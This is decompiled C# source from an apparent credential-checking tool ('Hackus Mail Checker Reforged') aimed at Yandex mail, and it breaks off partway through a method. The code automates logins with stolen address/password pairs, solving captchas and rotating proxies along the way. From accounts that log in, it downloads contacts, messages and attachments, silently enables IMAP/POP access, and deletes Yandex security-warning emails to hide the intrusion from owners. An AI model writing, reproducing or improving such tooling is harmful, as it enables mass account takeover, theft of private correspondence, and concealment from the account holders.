using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Web.Yandex;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000B3 RID: 179
	internal class YandexClientNew
	{
		// Token: 0x1700013A RID: 314
		// (get) Token: 0x060005B8 RID: 1464 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x060005B9 RID: 1465 RVA: 0x00009D14 File Offset: 0x00007F14
		public YandexClientNew(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x060005BA RID: 1466 RVA: 0x00024F88 File Offset: 0x00023188
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				this.ProcessValid();
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
			}
		}

		// Token: 0x060005BB RID: 1467 RVA: 0x00024FFC File Offset: 0x000231FC
		private OperationResult Login()
		{
			OperationResult csrfToken;
			OperationResult trackId;
			OperationResult item4;
			OperationResult operationResult2;
			for (;;)
			{
				this.Reset();
				csrfToken = this.GetCsrfToken();
				if (csrfToken == OperationResult.Error)
				{
					break;
				}
				if (csrfToken != OperationResult.HttpError)
				{
					trackId = this.GetTrackId();
					switch (trackId)
					{
					case OperationResult.Bad:
						goto IL_1B1;
					case OperationResult.Error:
						goto IL_1D3;
					case OperationResult.HttpError:
						break;
					default:
					{
						OperationResult operationResult = this.CreateSession();
						if (operationResult == OperationResult.Captcha)
						{
							if (!WebSettings.Instance.SolveCaptcha || string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
							{
								return OperationResult.Captcha;
							}
							ValueTuple<OperationResult, string, string> captchaLink = this.GetCaptchaLink();
							OperationResult item = captchaLink.Item1;
							string item2 = captchaLink.Item2;
							string item3 = captchaLink.Item3;
							if (item == OperationResult.Error)
							{
								goto IL_18B;
							}
							if (item == OperationResult.HttpError)
							{
								break;
							}
							ValueTuple<OperationResult, MemoryStream> captchaImage = this.GetCaptchaImage(item2);
							item4 = captchaImage.Item1;
							MemoryStream item5 = captchaImage.Item2;
							if (item4 == OperationResult.Error)
							{
								goto Block_8;
							}
							if (item4 == OperationResult.HttpError)
							{
								break;
							}
							ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveCaptcha(Convert.ToBase64String(item5.ToArray()), "ru", false);
							OperationResult item6 = valueTuple.Item1;
							string item7 = valueTuple.Item2;
							if (item6 == OperationResult.Error)
							{
								return OperationResult.Captcha;
							}
							if (item6 == OperationResult.HttpError)
							{
								break;
							}
							operationResult2 = this.SubmitCaptchaAnswer(item3, item7);
							if (operationResult2 == OperationResult.Error)
							{
								goto IL_16A;
							}
							if (operationResult2 == OperationResult.HttpError)
							{
								break;
							}
							operationResult = this.CreateSession();
						}
						if (operationResult != OperationResult.HttpError)
						{
							return operationResult;
						}
						break;
					}
					}
				}
			}
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, "Can't get csrf token");
			return csrfToken;
			Block_8:
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, "Can't get captcha image");
			return item4;
			IL_16A:
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, "Can't submit captcha answer");
			return operationResult2;
			IL_18B:
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, "Can't get captcha link");
			return OperationResult.Error;
			IL_1B1:
			StatisticsManager.Instance.AddBadDetails(this._mailbox.Address, "User doesn't exist");
			return trackId;
			IL_1D3:
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, "Can't get trackId");
			return trackId;
		}

		// Token: 0x060005BC RID: 1468 RVA: 0x00025200 File Offset: 0x00023400
		private OperationResult GetCsrfToken()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					Match match = Regex.Match(httpRequest.Post("https://passport.yandex.ru/registration-validations/auth/accounts").ToString(), "\"csrf\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._csrfToken = match.Groups[1].Value;
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005BD RID: 1469 RVA: 0x000252A8 File Offset: 0x000234A8
		private OperationResult GetTrackId()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						string value = this._mailbox.Address.Split(new char[]
						{
							'@'
						})[0];
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>("csrf_token", this._csrfToken),
							new KeyValuePair<string, string>("login", value)
						}, false, null);
						string text = httpRequest.Post("https://passport.yandex.ru/registration-validations/auth/multi_step/start", formUrlEncodedContent).ToString();
						if (text.Contains("can_register"))
						{
							return OperationResult.Bad;
						}
						Match match = Regex.Match(text, "\"track_id\":\"(.+?)\"");
						if (!match.Success)
						{
							return OperationResult.Error;
						}
						this._trackId = match.Groups[1].Value;
						return OperationResult.Ok;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005BE RID: 1470 RVA: 0x000253E0 File Offset: 0x000235E0
		private OperationResult CreateSession()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>("csrf_token", this._csrfToken),
							new KeyValuePair<string, string>("password", this._mailbox.Password),
							new KeyValuePair<string, string>("track_id", this._trackId)
						}, false, null);
						string text = httpRequest.Post("https://passport.yandex.ru/registration-validations/auth/multi_step/commit_password", formUrlEncodedContent).ToString();
						if (text.Contains("captcha"))
						{
							return OperationResult.Captcha;
						}
						if (text.ContainsOne(new string[]
						{
							"change_password",
							"auth_challenge"
						}))
						{
							return OperationResult.Blocked;
						}
						if (text.Contains("not_matched"))
						{
							return OperationResult.Bad;
						}
						if (!text.ContainsOne(new string[]
						{
							"passport.yandex.ru/profile",
							"{\"status\":\"ok\"}"
						}))
						{
							return OperationResult.Error;
						}
						return OperationResult.Ok;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005BF RID: 1471 RVA: 0x00025580 File Offset: 0x00023780
				private ValueTuple<OperationResult, string, string> GetCaptchaLink()
		{
			for (int i = 0; i < 3; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
						httpRequest.AllowAutoRedirect = false;
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>("csrf_token", this._csrfToken),
							new KeyValuePair<string, string>("track_id", this._trackId)
						}, false, null);
						string input = httpRequest.Post("https://passport.yandex.ru/registration-validations/textcaptcha", formUrlEncodedContent).ToString();
						Match match = Regex.Match(input, "\"image_url\":\"(.+?)\"");
						if (!match.Success)
						{
							return new ValueTuple<OperationResult, string, string>(OperationResult.Error, null, null);
						}
						string value = match.Groups[1].Value;
						match = Regex.Match(input, "\"key\":\"(.+?)\"");
						if (!match.Success)
						{
							return new ValueTuple<OperationResult, string, string>(OperationResult.Error, null, null);
						}
						string value2 = match.Groups[1].Value;
						return new ValueTuple<OperationResult, string, string>(OperationResult.Ok, value, value2);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, string, string>(OperationResult.HttpError, null, null);
		}

		// Token: 0x060005C0 RID: 1472 RVA: 0x0002571C File Offset: 0x0002391C
				private ValueTuple<OperationResult, MemoryStream> GetCaptchaImage(string url)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						MemoryStream memoryStream = httpRequest.Get(url, null).ToMemoryStream();
						if (memoryStream != null && memoryStream.Length != 0L)
						{
							return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Ok, memoryStream);
						}
						return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Error, null);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, MemoryStream>(OperationResult.HttpError, null);
		}

		// Token: 0x060005C1 RID: 1473 RVA: 0x000257B8 File Offset: 0x000239B8
		private OperationResult SubmitCaptchaAnswer(string key, string answer)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>("csrf_token", this._csrfToken),
							new KeyValuePair<string, string>("track_id", this._trackId),
							new KeyValuePair<string, string>("answer", answer),
							new KeyValuePair<string, string>("key", key)
						}, false, null);
						if (httpRequest.Post("https://passport.yandex.ru/registration-validations/checkHuman", formUrlEncodedContent).ToString().Contains("ok"))
						{
							return OperationResult.Ok;
						}
						return OperationResult.Error;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005C2 RID: 1474 RVA: 0x000258E8 File Offset: 0x00023AE8
		private OperationResult DownloadContacts()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
					StringBuilder stringBuilder = new StringBuilder("{\"models\":[{\"name\":\"abook-contacts\",\"params\":{ },\"meta\":{\"requestAttempt\":1}}],\"_ckey\":\"");
					stringBuilder.Append(this._ckey);
					stringBuilder.Append("\",\"_product\":\"RUS\",\"_service\":\"LIZA\",\"_version\":\"67.1.0\"}");
					foreach (object obj in Regex.Matches(httpRequest.Post("https://mail.yandex.ru/web-api/models/liza1", stringBuilder.ToString(), "application/json").ToString(), "\"value\":\"(.+?)\""))
					{
						FileManager.SaveContact(((Match)obj).Groups[1].Value);
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Retry;
		}

		// Token: 0x060005C3 RID: 1475 RVA: 0x00025A18 File Offset: 0x00023C18
		private void ProcessValid()
		{
			if (!this.SearchSettings.Search && !SearchSettings.Instance.ParseContacts && (!this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.Everywhere) && !WebSettings.Instance.EnableYandexImapAccess)
			{
				return;
			}
			this.GetCKey();
			if (this._ckey == null)
			{
				return;
			}
			OperationResult operationResult = OperationResult.Retry;
			int num = 0;
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			bool flag4 = false;
			bool flag5 = false;
			bool flag6 = false;
			bool flag7 = false;
			bool flag8 = false;
			List<Request> list = new List<Request>();
			Queue<Uid> queue = null;
			List<Uid> list2 = new List<Uid>();
			while (operationResult == OperationResult.Retry)
			{
				if (num <= 2)
				{
					if (!flag && SearchSettings.Instance.ParseContacts)
					{
						operationResult = this.DownloadContacts();
						if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
						{
							flag = true;
						}
					}
					else
					{
						operationResult = OperationResult.Ok;
					}
					if (operationResult == OperationResult.Retry)
					{
						if (ProxySettings.Instance.UseProxy)
						{
							this._proxyClient = ProxyManager.Instance.GetProxy();
							continue;
						}
						continue;
					}
					else
					{
						if (!flag2 && this.SearchSettings.Search)
						{
							operationResult = this.SearchMessages(list);
							if (operationResult == OperationResult.Ok)
							{
								flag2 = true;
							}
						}
						else
						{
							operationResult = OperationResult.Ok;
						}
						if (operationResult == OperationResult.Retry)
						{
							if (ProxySettings.Instance.UseProxy)
							{
								this._proxyClient = ProxyManager.Instance.GetProxy();
								continue;
							}
							continue;
						}
						else if (operationResult != OperationResult.Bad)
						{
							if (!flag8 && WebSettings.Instance.EnableYandexImapAccess)
							{
								operationResult = this.EnableImapAccess();
								if (operationResult == OperationResult.Ok || operationResult == OperationResult.Error)
								{
									flag8 = true;
								}
							}
							else
							{
								operationResult = OperationResult.Ok;
							}
							if (operationResult != OperationResult.Retry)
							{
								if (!flag3 && this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.Everywhere)
								{
									operationResult = this.SearchAttachments(ref queue);
									if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
									{
										flag3 = true;
									}
								}
								else
								{
									operationResult = OperationResult.Ok;
								}
								if (operationResult == OperationResult.Retry)
								{
									if (ProxySettings.Instance.UseProxy)
									{
										this._proxyClient = ProxyManager.Instance.GetProxy();
										continue;
									}
									continue;
								}
								else
								{
									if (!flag4 && WebSettings.Instance.DeleteYandexWarningMessages)
									{
										operationResult = this.SearchSecurityMessages(list2);
										flag4 = true;
									}
									else
									{
										operationResult = OperationResult.Ok;
									}
									if (!flag5 && this.SearchSettings.DeleteWhenDownloaded)
									{
										foreach (Request request in list)
										{
											list2.AddRange(request.SavedUids);
										}
										flag5 = true;
									}
									else
									{
										operationResult = OperationResult.Ok;
									}
									list2 = new List<Uid>(list2.Distinct<Uid>());
									if (!flag7 && list2.Any<Uid>())
									{
										if (!flag6)
										{
											operationResult = this.MoveMessages(list2);
											if (operationResult == OperationResult.Ok)
											{
												flag6 = true;
											}
										}
										if (operationResult == OperationResult.Ok)
										{
											operationResult = this.DeleteMessages(list2);
											if (operationResult == OperationResult.Ok)
											{
												flag7 = true;
											}
										}
										if (operationResult == OperationResult.Bad)
										{
											flag6 = true;
											flag7 = true;
											break;
										}
									}
									else
									{
										operationResult = OperationResult.Ok;
									}
									if (operationResult != OperationResult.Retry)
									{
										continue;
									}
									if (ProxySettings.Instance.UseProxy)
									{
										this._proxyClient = ProxyManager.Instance.GetProxy();
										continue;
									}
									continue;
								}
							}
							else
							{
								if (ProxySettings.Instance.UseProxy)
								{
									this._proxyClient = ProxyManager.Instance.GetProxy();
									continue;
								}
								continue;
							}
						}
					}
				}
				IL_2BF:
				foreach (Request request2 in list)
				{
					int count = request2.Count;
					if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
					{
						MailboxResult result = new MailboxResult(this._mailbox, request2.ToString(), count);
						MailManager.Instance.AddResult(result);
						StatisticsManager.Instance.IncrementFound();
						FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request2.ToString(), count);
					}
				}
				return;
			}
			goto IL_2BF;
		}

		// Token: 0x060005C4 RID: 1476 RVA: 0x00025DB0 File Offset: 0x00023FB0
		private OperationResult GetCKey()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						string input = httpRequest.Get("https://mail.yandex.ru/lite/inbox", null).ToString();
						string text;
						if (httpRequest == null)
						{
							text = null;
						}
						else
						{
							HttpResponse response = httpRequest.Response;
							if (response == null)
							{
								text = null;
							}
							else
							{
								Uri address = response.Address;
								text = ((address != null) ? address.AbsolutePath : null);
							}
						}
						string text2 = text;
						if (text2 != null && text2.Contains("captcha"))
						{
							return OperationResult.Captcha;
						}
						Match match = Regex.Match(input, "name=\"_ckey\" value=\"(.+?)\"");
						if (match.Success)
						{
							this._ckey = match.Groups[1].Value;
						}
						return OperationResult.Error;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005C5 RID: 1477 RVA: 0x00025EAC File Offset: 0x000240AC
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => YandexClientNew._c__DisplayClass20_0.smethod_0(r.Sender, request.Sender) && YandexClientNew._c__DisplayClass20_0.smethod_0(r.Body, request.Body) && YandexClientNew._c__DisplayClass20_0.smethod_0(r.Subject, request.Subject));
					if (request3 != null)
					{
						if (request3.IsChecked)
						{
							continue;
						}
						if (request3.SavedUids != null)
						{
							if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
							{
								continue;
							}
						}
					}
					else
					{
						request3 = request.Clone();
						request3.FindedUids = new HashSet<Uid>();
						request3.SavedUids = new HashSet<Uid>();
						checkedRequests.Add(request3);
					}
					Request request2 = request3;
					if (!request2.FindedUids.Any<Uid>())
					{
						OperationResult operationResult = this.Search(request2);
						if (operationResult == OperationResult.Error)
						{
							request2.IsChecked = true;
							continue;
						}
						if (operationResult == OperationResult.HttpError)
						{
							return OperationResult.Retry;
						}
					}
					if (this.SearchSettings.DownloadLetters)
					{
						if (CheckerSettings.Instance.UsePop3Limit && request2.FindedUids.Count > CheckerSettings.Instance.Pop3Limit)
						{
							request3.FindedUids = new HashSet<Uid>(request3.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
						}
						using (HashSet<Uid>.Enumerator enumerator2 = request3.FindedUids.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								Uid uid = enumerator2.Current;
								if (!request3.SavedUids.Any((Uid u) => u == uid))
								{
									if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
									{
										break;
									}
									MailMessage message;
									OperationResult operationResult2 = this.FetchMessage(uid, this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded, out message);
									if (operationResult2 != OperationResult.Error)
									{
										if (operationResult2 == OperationResult.HttpError)
										{
											return OperationResult.Retry;
										}
										request3.SavedUids.Add(uid);
										FileManager.SaveWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
									}
									else
									{
										request3.SavedUids.Add(uid);
									}
								}
							}
						}
					}
					request2.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x060005C6 RID: 1478 RVA: 0x00026138 File Offset: 0x00024338
		private OperationResult SearchAttachments(ref Queue<Uid> leftAttachmentMessages)
		{
			this.WaitPause();
			if (leftAttachmentMessages == null)
			{
				OperationResult result;
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
						StringBuilder stringBuilder = new StringBuilder("{\"models\":[{\"name\":\"messages\",\"params\":{\"sort_type\":\"date\",\"attaches\":\"yes\",\"search\":\"search\"}}],\"_ckey\":\"");
						stringBuilder.Append(this._ckey);
						stringBuilder.Append("\",\"_product\":\"RUS\",\"_service\":\"LIZA\",\"_version\":\"67.1.0\",\"_messages_per_page\":\"50\"}");
						string input = httpRequest.Post("https://mail.yandex.ru/web-api/models/liza1", stringBuilder.ToString(), "application/json").ToString();
						leftAttachmentMessages = new Queue<Uid>();
						if (!Regex.Match(input, "\"status\":\"ok\"").Success)
						{
							return OperationResult.Ok;
						}
						foreach (object obj in Regex.Matches(input, "mid\":\"(.+?)\""))
						{
							Match match = (Match)obj;
							leftAttachmentMessages.Enqueue(new Uid(match.Groups[1].Value));
						}
					}
					goto IL_149;
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
					result = OperationResult.Retry;
				}
				return result;
			}
			IL_149:
			while (leftAttachmentMessages.Any<Uid>())
			{
				Uid uid = leftAttachmentMessages.Dequeue();
				MailMessage mailMessage;
				if (this.FetchMessage(uid, true, out mailMessage) == OperationResult.HttpError)
				{
					return OperationResult.Retry;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x060005C7 RID: 1479 RVA: 0x00026300 File Offset: 0x00024500
		private OperationResult SearchSecurityMessages(List<Uid> toDelete)
		{
			Request request = new Request
			{
				Sender = "noreply@id.yandex.ru"
			};
			request.FindedUids = new HashSet<Uid>();
			if (this.Search(request) == OperationResult.Ok)
			{
				toDelete.AddRange(request.FindedUids.Take(1));
			}
			return OperationResult.Ok;
		}

		// Token: 0x060005C8 RID: 1480 RVA: 0x0002634C File Offset: 0x0002454C
		private OperationResult MoveMessages(List<Uid> uids)
		{
			this.WaitPause();
			OperationResult result;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
					StringBuilder stringBuilder = new StringBuilder("[");
					for (int i = 0; i < uids.Count; i++)
					{
						stringBuilder.Append("\"");
						stringBuilder.Append(uids[i].UID);
						if (i == uids.Count - 1)
						{
							stringBuilder.Append("\"");
						}
						else
						{
							stringBuilder.Append("\", ");
						}
					}
					stringBuilder.Append("]");
					string text = string.Concat(new string[]
					{
						"{\"models\":[{\"name\":\"do-messages\",\"params\":{\"movefile\":\"3\",\"action\":\"delete\",\"with_sent\":\"0\",\"tids\":",
						stringBuilder.ToString(),
						"}}],\"_ckey\":\"",
						this._ckey,
						"\",\"_product\":\"RUS\",\"_service\":\"LIZA\",\"_version\":\"67.1.0\"}"
					});
					if (httpRequest.Post("https://mail.yandex.ru/web-api/models/liza1", text, "application/json").ToString().Contains("\"status\":\"ok\""))
					{
						result = OperationResult.Ok;
					}
					else
					{
						result = OperationResult.Bad;
					}
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.Retry;
			}
			return result;
		}

		// Token: 0x060005C9 RID: 1481 RVA: 0x000264EC File Offset: 0x000246EC
		private OperationResult DeleteMessages(List<Uid> uids)
		{
			this.WaitPause();
			OperationResult result;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
					StringBuilder stringBuilder = new StringBuilder("[");
					for (int i = 0; i < uids.Count; i++)
					{
						stringBuilder.Append("\"");
						stringBuilder.Append(uids[i].UID);
						if (i != uids.Count - 1)
						{
							stringBuilder.Append("\", ");
						}
						else
						{
							stringBuilder.Append("\"");
						}
					}
					stringBuilder.Append("]");
					string text = string.Concat(new string[]
					{
						"{\"models\":[{\"name\":\"do-messages\",\"params\":{\"movefile\":\"3\",\"action\":\"delete\",\"with_sent\":\"0\",\"ids\":",
						stringBuilder.ToString(),
						"}}],\"_ckey\":\"",
						this._ckey,
						"\",\"_product\":\"RUS\",\"_service\":\"LIZA\",\"_version\":\"67.1.0\"}"
					});
					if (httpRequest.Post("https://mail.yandex.ru/web-api/models/liza1", text, "application/json").ToString().Contains("\"status\":\"ok\""))
					{
						result = OperationResult.Ok;
					}
					else
					{
						result = OperationResult.Bad;
					}
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.Retry;
			}
			return result;
		}

		// Token: 0x060005CA RID: 1482 RVA: 0x0002668C File Offset: 0x0002488C
		private OperationResult Search(Request searchRequest)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
					string input = httpRequest.Post("https://mail.yandex.ru/web-api/models/liza1", this.BuildSearchQuery(searchRequest), "application/json").ToString();
					Match match = Regex.Match(input, "\"status\":\"ok\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					match = Regex.Match(input, "\"total-found\":(.+?),");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					searchRequest.Count = int.Parse(match.Groups[1].Value);
					foreach (object obj in Regex.Matches(input, "mid\":\"(.+?)\""))
					{
						Match match2 = (Match)obj;
						searchRequest.FindedUids.Add(new Uid(match2.Groups[1].Value));
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005CB RID: 1483 RVA: 0x00026838 File Offset: 0x00024A38
		private OperationResult FetchMessage(Uid uid, bool downloadAttachments, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
					string text = string.Concat(new string[]
					{
						"{\"models\":[{\"name\":\"message-body\",\"params\":{\"ids\":\"",
						uid.UID.ToString(),
						"\"}}],\"_ckey\":\"",
						this._ckey,
						"\",\"_product\":\"RUS\",\"_service\":\"LIZA\",\"_version\":\"67.1.0\"}"
					});
					string text2 = httpRequest.Post("https://mail.yandex.ru/web-api/models/liza1", text, "application/json").ToString();
					Match match = Regex.Match(text2, "\"timestamp\":(.+?),");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					long unixTimeStamp = long.Parse(match.Groups[1].Value);
					message.Date = DateHelpers.UnixTimeStampToDateInMilliseconds(unixTimeStamp);
					match = Regex.Match(text2, "\"content\":\"(.+?)\",\"length\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.AlternateViews.Add(new Attachment("text/html", match.Groups[1].Value));
					match = Regex.Match(text2, "\"email\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.From = match.Groups[1].Value;
					message.Subject = "NONE";
					if (downloadAttachments)
					{
						try
						{
							if (text2.Contains("\"attachment\":[]"))
							{
								return OperationResult.Ok;
							}
							match = Regex.Match(text2, "\"attachment\":(\\[.+?\\])");
							if (match.Success)
							{
								AttachmentInfo[] array = JsonConvert.DeserializeObject<AttachmentInfo[]>(match.Groups[1].Value);
								for (int i = 0; i < array.Length; i++)
								{
									AttachmentInfo attachment = array[i];
									attachment.Ids = uid.UID;
									if (!SearchSettings.Instance.UseAttachmentFilters || SearchSettings.Instance.AttachmentFilters.Any((string filter) => attachment.Name.ContainsIgnoreCase(filter)))
									{
										Attachment attachment2 = this.FetchAttachment(attachment);
										if (attachment2 != null)
										{
											FileManager.SaveAttachment(attachment2, this._mailbox.Address);
										}
									}
								}
							}
						}
						catch
						{
						}
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005CC RID: 1484 RVA: 0x00026B34 File Offset: 0x00024D34
		private Attachment FetchAttachment(AttachmentInfo attachmentInfo)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = true;
					httpRequest.AddUrlParam("name", attachmentInfo.Name);
					httpRequest.AddUrlParam("hid", attachmentInfo.Hid);
					httpRequest.AddUrlParam("ids", attachmentInfo.Ids);
					MemoryStream memoryStream = httpRequest.Get("https://mail.yandex.ru/message_part/" + attachmentInfo.Name, null).ToMemoryStream();
					if (memoryStream != null && memoryStream.Length != 0L && httpRequest.Response.IsOK)
					{
						return new Attachment
						{
							Name = attachmentInfo.Name,
							Body = memoryStream.ToArray()
						};
					}
					return null;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060005CD RID: 1485 RVA: 0x00026C40 File Offset: 0x00024E40
		private OperationResult EnableImapAccess()
		{
			this.WaitPause();
			OperationResult result;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
					string text = "{\"models\":[{\"name\":\"do-settings\",\"params\":{\"params\":\"{\\\"enable_imap\\\":true,\\\"enable_imap_auth_plain\\\":true,\\\"enable_pop\\\":true,\\\"fid\\\":[\\\"1\\\"]}\"}},{\"name\":\"settings\",\"params\":{\"list\":\"enable_imap,enable_imap_auth_plain,enable_pop,fid\",\"actual\":\"true\",\"withoutSigns\":\"true\"}}],\"_ckey\":\"" + this._ckey + "\",\"_product\":\"RUS\",\"_service\":\"LIZA\",\"_version\":\"67.1.0\"}";
					if (httpRequest.Post("https://mail.yandex.ru/web-api/models/liza1", text, "application/json").ToString().Contains("\"status\":\"ok\""))
					{
						result = OperationResult.Ok;
					}
					else
					{
						result = OperationResult.Error;
					}
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.Retry;
			}
			return result;
		}

		// Token: 0x060005CE RID: 1486 RVA: 0x00026D10 File Offset: 0x00024F10
		private string BuildSearchQuery(Request request)
		{
